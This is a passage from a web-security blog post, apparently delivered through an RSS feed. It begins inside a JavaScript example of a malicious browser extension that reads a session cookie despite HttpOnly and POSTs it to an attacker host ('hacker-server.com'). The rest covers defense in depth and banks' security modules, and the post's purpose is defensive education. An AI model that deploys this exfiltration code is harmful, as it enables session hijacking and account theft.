&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kr">const&lt;/span> &lt;span class="nx">COOKIE_NAME&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;session_id&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// The name of your application&amp;#39;s session cookie
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// This function is called when the user accesses the target site
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="kr">async&lt;/span> &lt;span class="kd">function&lt;/span> &lt;span class="nx">extractCookie&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">try&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// The chrome.cookies.get API has privileges to access cookies,
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// bypassing the HttpOnly restriction that applies only to page scripts.
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kr">const&lt;/span> &lt;span class="nx">cookie&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kr">await&lt;/span> &lt;span class="nx">chrome&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">cookies&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">get&lt;/span>&lt;span class="p">({&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">url&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="nx">TARGET_DOMAIN&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">name&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="nx">COOKIE_NAME&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">});&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">cookie&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">console&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">log&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;Session cookie successfully intercepted.&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kr">const&lt;/span> &lt;span class="nx">token&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">cookie&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">value&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// Send the token to a remote server controlled by the attacker
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nx">fetch&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sb">`https://hacker-server.com/collector`&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">method&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;POST&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">headers&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">{&lt;/span> &lt;span class="s2">&amp;#34;Content-Type&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;application/json&amp;#34;&lt;/span> &lt;span class="p">},&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">body&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="nx">JSON&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">stringify&lt;/span>&lt;span class="p">({&lt;/span> &lt;span class="nx">domain&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="nx">TARGET_DOMAIN&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">sessionToken&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="nx">token&lt;/span> &lt;span class="p">}),&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">});&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span> &lt;span class="k">catch&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">error&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">console&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">error&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;Error accessing cookie:&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">error&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// Add a &amp;#34;listener&amp;#34; that triggers the function when the tab is updated
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="nx">chrome&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">tabs&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">onUpdated&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">addListener&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">tabId&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">changeInfo&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">tab&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">changeInfo&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">status&lt;/span> &lt;span class="o">===&lt;/span> &lt;span class="s2">&amp;#34;complete&amp;#34;&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="nx">tab&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">url&lt;/span>&lt;span class="o">?&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">startsWith&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">TARGET_DOMAIN&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">extractCookie&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">});&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Silently and invisibly to the user, the extension uses its privileges to read the session cookie and send it to an external server. The attacker can now use this token to impersonate the user.&lt;/p>
&lt;h1 id="an-important-distinction-site-vulnerability-vs-compromised-environment">An Important Distinction: Site Vulnerability vs. Compromised Environment
&lt;/h1>&lt;p>It&amp;rsquo;s crucial to differentiate between the following scenarios:&lt;/p>
&lt;ul>
&lt;li>
&lt;p>&lt;code>XSS&lt;/code>: This is a &lt;strong>security flaw in your application&lt;/strong>. You, the developer, are responsible for preventing it. HttpOnly is your primary mitigation tool.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>Extension Hijacking&lt;/code>: This is a &lt;strong>compromise of the client&amp;rsquo;s environment&lt;/strong>. Your application may be perfectly secure. The problem lies in the user&amp;rsquo;s trust in third-party software.&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h1 id="our-role-as-developers-creating-defense-in-depth">Our Role as Developers: Creating Defense in Depth
&lt;/h1>&lt;p>While we can&amp;rsquo;t control the extensions our users install, we can design our systems to be more resilient and limit the damage if a credential is compromised. This is called Defense in Depth.&lt;/p>
&lt;ul>
&lt;li>
&lt;p>&lt;strong>Maintain Short-Lived Access Tokens&lt;/strong>: An access token that expires in 5 to 15 minutes drastically limits an attacker&amp;rsquo;s window of opportunity.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>Consider Rotating Refresh Tokens&lt;/strong>: Implement rotation of single-use refresh tokens. If an old token is reused, it&amp;rsquo;s a warning sign that the session has been compromised, allowing you to invalidate it immediately.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>Link the Session to Other Factors&lt;/strong>: On critical systems, add IP address or browser fingerprint checks to detect anomalies in session usage.&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h1 id="a-real-world-example-why-banks-force-you-to-quit-your-browser">A Real-World Example: Why Banks Force You to Quit Your Browser
&lt;/h1>&lt;p>If all this talk about browser risks seems theoretical, let&amp;rsquo;s look at what the most security-paranoid institutions—banks—do.&lt;/p>
&lt;p>Have you ever wondered why banks like Itaú, and others insist that you install a &amp;ldquo;Security Module&amp;rdquo; or &amp;ldquo;Guardian&amp;rdquo; to access online banking on your computer? Why don&amp;rsquo;t they trust you to simply open the website in the browser, like everyone else?&lt;/p>
&lt;p>The answer is simple: they consider the default browser environment inherently insecure and hostile.&lt;/p>
&lt;p>They know they have no control over the extensions you&amp;rsquo;ve installed, or the potential malware or keyloggers running on your machine. Their conclusion is logical and drastic: &amp;ldquo;If we can&amp;rsquo;t trust the environment, we won&amp;rsquo;t play in it.&amp;rdquo;&lt;/p>
&lt;p>These security modules do several things:&lt;/p>
&lt;ul>
&lt;li>
&lt;p>&lt;strong>They attempt to create a &amp;ldquo;secure desktop,&amp;rdquo; isolating the banking session from other processes.&lt;/strong>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>They actively monitor for known malware, keyloggers, and screen capture software.&lt;/strong>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>They prevent other windows from overlapping the banking window (overlay attacks).&lt;/strong>&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>Essentially, instead of trying to protect an application within an environment they don&amp;rsquo;t control, &lt;strong>they remove the application from the hostile environment.&lt;/strong> They force the user into a &amp;ldquo;bubble of trust,&amp;rdquo; a secure tunnel they manage themselves, minimizing the risks we discussed.&lt;/p>
&lt;p>This is defense in depth taken to the extreme. For most of us, e-commerce, SaaS, or admin panel developers, forcing users to install a desktop application is unfeasible. But the banks&amp;rsquo; logic teaches us a valuable lesson about the importance of distrusting the customer environment and building our own layers of resilience.&lt;/p>
&lt;h1 id="building-trust-on-solid-foundations">Building Trust on Solid Foundations
&lt;/h1>&lt;p>Securing our applications is an ongoing challenge. Configuring secure cookies with HttpOnly remains an essential and non-negotiable practice, as it protects us from the most common threat: XSS.&lt;/p>
&lt;p>Understanding the risk of extensions and observing banks&amp;rsquo; strategies does not diminish the importance of these measures. On the contrary, it reinforces the need to think about security holistically. Our job is to build systems that protect our users not only from vulnerabilities in our own code, but also from risks in the ecosystem in which our applications operate.&lt;/p></description></item></channel></rss>